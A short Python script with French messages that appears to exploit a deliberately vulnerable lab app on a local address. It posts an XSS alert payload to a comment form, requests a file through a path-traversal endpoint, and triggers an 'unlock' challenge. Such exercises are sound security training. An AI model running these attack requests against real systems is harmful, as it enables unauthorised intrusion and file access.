#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

BASE_URL = "http://192.168.1.79:5000"

def main():
    session = requests.Session()

    # 1) XSS
    xss_payload = "<script>alert('XSS by DVIL');</script>"
    r_xss = session.post(f"{BASE_URL}/v2/xss", data={"comment": xss_payload})
    if r_xss.status_code == 200 and "Votre commentaire" in r_xss.text:
        print("[OK] Faille XSS exploitée !")
    else:
        print(f"[FAIL] XSS non exploitée (status={r_xss.status_code})")
        print(r_xss.text)
        return

    # 2) Traversal
    file_to_read = "{@uvrE_M0i}"  # Assure-toi qu'il existe bien dans /uploads/
    r_trav = session.get(f"{BASE_URL}/v2/traversal?file={file_to_read}")
    if r_trav.status_code == 200 and "Erreur" not in r_trav.text:
        print("[OK] Faille Path Traversal exploitée !")
        print("Contenu lu :", r_trav.text[:120], "...")
    else:
        print(f"[FAIL] Path Traversal échouée (status={r_trav.status_code})")
        print(r_trav.text)
        return

    # 3) Unlock
    r_unlock = session.post(f"{BASE_URL}/v2/unlock_challenge")
    try:
        data = r_unlock.json()
        if data.get("status") == "success":
            print("[SUCCESS] Serrure déverrouillée (via challenge) !")
        else:
            print("[FAIL] Unlock :", data)
    except Exception:
        print("[FAIL] Unlock : réponse non JSON :", r_unlock.text)

if __name__ == "__main__":
    main()
